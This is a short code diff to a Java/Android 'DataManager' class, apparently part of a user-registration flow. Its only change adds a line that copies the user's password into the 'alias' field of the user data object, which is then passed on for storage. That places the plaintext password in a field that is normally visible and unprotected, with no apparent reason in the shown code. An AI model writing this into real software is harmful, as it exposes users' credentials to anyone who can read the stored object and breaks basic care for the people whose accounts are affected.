@@ -55,6 +55,7 @@ public class DataManager {
                     ObjectBoundary userData = user.toBoundary();
                     superapp = userData.getCreatedBy().getUserId().getSuperapp();
                     userData.setCreatedBy(userId);
+                    userData.setAlias(user.getPassword());
                     listenerCreate.onUserCreated(email);
                     // Delay the user data creation by 10 seconds
                     new Handler().postDelayed(new Runnable() {
